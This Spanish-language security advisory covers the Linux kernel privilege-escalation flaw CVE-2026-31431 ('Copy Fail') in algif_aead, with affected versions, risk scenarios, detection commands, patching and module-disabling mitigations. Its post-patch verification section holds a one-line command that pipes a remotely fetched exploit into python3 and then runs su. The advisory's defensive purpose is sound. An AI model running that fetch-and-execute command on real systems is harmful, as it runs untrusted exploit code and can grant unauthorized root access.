El pasado 29 de abril de 2026 se divulgó públicamente
[CVE-2026-31431](https://nvd.nist.gov/vuln/detail/CVE-2026-31431), *Copy Fail*.
Se trata de un fallo de escalado de privilegios local (LPE, por sus siglas en
inglés) en el kernel de Linux que permite, a cualquier usuario sin privilegios,
obtener acceso de `root`, con un script de **732 bytes** en Python
[🔗](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py).
El fallo ha estado presente desde 2017 y afecta a prácticamente todas las
distribuciones Linux publicadas desde entonces.

<!-- more -->

Fue descubierto por el equipo de [Xint Code](https://xint.io/) (de la firma
Theori) durante un escaneo automático del subsistema `crypto/` del kernel, y ya
ha sido incluido en el [catálogo de vulnerabilidades explotadas
(KEV)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) de la CISA,
con fecha límite para remediar el fallo hasta el 15 de mayo de 2026 en entidades
del gobierno estadounidense. Su identificador CWE es
[CWE-669](https://cwe.mitre.org/data/definitions/669.html) (*Incorrect Resource
Transfer Between Spheres*) y su puntuación CVSS 3.1 es de 7.8 (ALTO).

## ¿En qué consiste el fallo?

El error reside en el módulo `algif_aead`, la interfaz de usuario del API
criptográfica del kernel a través de `AF_ALG`. En 2017, el commit
[`72548b093ee3`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=72548b093ee3)
introdujo una optimización que permitía operaciones *in-place* (en el mismo
lugar) en el cifrado autenticado (AEAD). La idea era evitar copias innecesarias,
pero introdujo un error sutil: las páginas del *page-cache* (la caché de páginas
del sistema de archivos) podían terminar en el *scatterlist* de destino con
permisos de escritura.

Encadenando una operación `AF_ALG` con la llamada al sistema `splice()`, un
atacante sin privilegios logra una escritura de 4 bytes en el *page-cache* de un
binario con bit `setuid` activo, como `/usr/bin/su`. Al modificar el código de
ese binario en memoria, el atacante obtiene un shell como `root` al invocarlo.

Lo que hace a Copy Fail particularmente peligroso es que:

- No necesita condición de carrera (*race condition*): es una falla lógica
  directa, no una ventana temporal.
- No depende de offsets específicos del kernel: el mismo exploit funciona
  sin modificaciones en cualquier distribución.
- No requiere acceso a red ni funciones de depuración del kernel: basta con
  una cuenta de usuario local.
- El módulo `AF_ALG` viene habilitado por defecto en prácticamente todas las
  distribuciones principales.

El parche correctivo es el commit
[`a664bf3d603d`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a664bf3d603d),
que revierte la optimización *in-place* y vuelve a operar copiando los datos
fuera del lugar de origen.

## ¿Quién está afectado?

Si tu kernel fue compilado entre 2017 y abril de 2026, estás dentro del alcance.
Las versiones afectadas según NVD son:

| Rango de versiones          |
|-----------------------------|
| 4.14 a 5.10.253             |
| 5.11 a 5.15.203             |
| 5.16 a 6.1.169              |
| 6.2 a 6.6.136               |
| 6.7 a 6.12.84               |
| 6.13 a 6.18.21              |
| 6.19 a 6.19.11              |
| 7.0-rc1 a 7.0-rc6           |

Los investigadores verificaron directamente el exploit en:

- Ubuntu 24.04 LTS (kernel `6.17.0-1007-aws`)
- Amazon Linux 2023 (kernel `6.18.8-9.213.amzn2023`)
- RHEL 10.1 (kernel `6.12.0-124.45.1.el10_1`)
- SUSE 16 (kernel `6.12.0-160000.9-default`)

Otras distribuciones como Debian, Arch, Fedora, Rocky, Alma y Oracle se
comportan igual por compartir el mismo subsistema.

### Escenarios de riesgo

El impacto varía según el contexto:

- Alto / Servidores multi-usuario y Kubernetes: cualquier usuario o pod puede
  escalar a `root` en el host. El page-cache se comparte, así que el ataque
  cruza fronteras de contenedores.
- Alto / Runners de CI: un Pull Request malicioso que se ejecute como usuario
  regular en GitHub Actions, GitLab CI o Jenkins puede comprometer el runner
  completo.
- Alto / SaaS que ejecuta código de usuarios: notebooks, sandboxes, funciones
  serverless.
- Medio / Servidores de un solo inquilino: no da acceso remoto por sí solo, pero
  amplifica cualquier RCE o robo de credenciales previo.
- Bajo / Laptops y workstations personales: el usuario ya es el dueño del
  equipo. El fallo es un escalón en una cadena de explotación más amplia.

## Cómo detectarlo en nuestros equipos

### 1. Verificar la versión del kernel

```bash
uname -r
```

Compara la salida con la tabla de versiones afectadas arriba. Por ejemplo, un
kernel `6.8.0` está en el rango 6.7–6.12.84 y por tanto es vulnerable.

### 2. Verificar si el módulo `algif_aead` está cargado

```bash
lsmod | grep algif_aead
```

Si el comando devuelve una línea con `algif_aead`, el módulo está activo y el
sistema es explotable. En la mayoría de las distribuciones aparecerá cargado
automáticamente al necesitarse.

### 3. Verificar si `AF_ALG` está disponible

```bash
grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)
```

Si muestra `=y` o `=m`, el subsistema está presente.

## Cómo corregirlo

La solución definitiva es actualizar el kernel a una versión que incluya el
parche. El commit principal es `a664bf3d603d` en la rama principal de Linus
Torvalds, y ya ha sido portado (*backported*) a las ramas estables.

### En Debian / Ubuntu

```bash
sudo apt update && sudo apt upgrade
```

Verifica que el nuevo paquete del kernel esté instalado y **reinicia el
sistema**:

```bash
uname -r          # confirmar versión nueva
sudo reboot
```

### En RHEL / Rocky / Alma / Fedora

```bash
sudo dnf update kernel
sudo reboot
```

### En Arch

```bash
sudo pacman -Syu linux
sudo reboot
```

### En openSUSE

```bash
sudo zypper update kernel-default
sudo reboot
```

### Verificación post-actualización

Tras reiniciar, confirma que el módulo `algif_aead` ya no permite la escritura
en el page-cache. El comando rápido para probar (¡solo en entornos de prueba!)
es descargar y ejecutar el PoC:

```bash
curl https://copy.fail/exp | python3 && su
```

Si el parche está aplicado, el exploit fallará.

## Cómo mitigarlo (si no puedes actualizar ya)

Si por alguna razón no puedes actualizar el kernel de inmediato, puedes
deshabilitar el módulo vulnerable. Esta mitigación **no requiere reiniciar** y
es efectiva de inmediato:

```bash
# 1. Bloquear la carga futura del módulo
echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf

# 2. Descargar el módulo si está cargado actualmente
sudo rmmod algif_aead
```

### ¿Qué se rompe al deshabilitar `algif_aead`?

Para la gran mayoría de los sistemas: **nada relevante**.

- No afecta: dm-crypt / LUKS, kTLS, IPsec/XFRM, TLS en el kernel,
  OpenSSL/GnuTLS/NSS, SSH, el keyring criptográfico del kernel. Todos estos usan
  el API criptográfica del kernel directamente, sin pasar por `AF_ALG`.
- Podría afectar: aplicaciones configuradas explícitamente para usar `AF_ALG`,
  como OpenSSL con el motor `afalg` activado manualmente, algunas rutas de
  descarga criptográfica en sistemas embebidos, o programas que vinculan sockets
  `aead`/`skcipher`/`hash` directamente. Verifica con:

  ```bash
  lsof 2>/dev/null | grep AF_ALG
  ss -xa | grep algif
  ```

- Rendimiento: `AF_ALG` es una puerta de entrada de espacio de usuario al
  API criptográfica del kernel. Deshabilitarlo no ralentiza nada que no lo
  estuviera usando ya; para lo que sí lo usaba, el rendimiento simplemente
  regresa a una biblioteca criptográfica normal en espacio de usuario, que es lo
  que casi todo el software ya hace de todas formas.

### Refuerzo adicional para contenedores

Para cargas de trabajo no confiables (contenedores, sandboxes, CI),
independientemente del estado del parche, bloquea la creación de sockets
`AF_ALG` mediante un perfil seccomp o una política de AppArmor/SELinux.
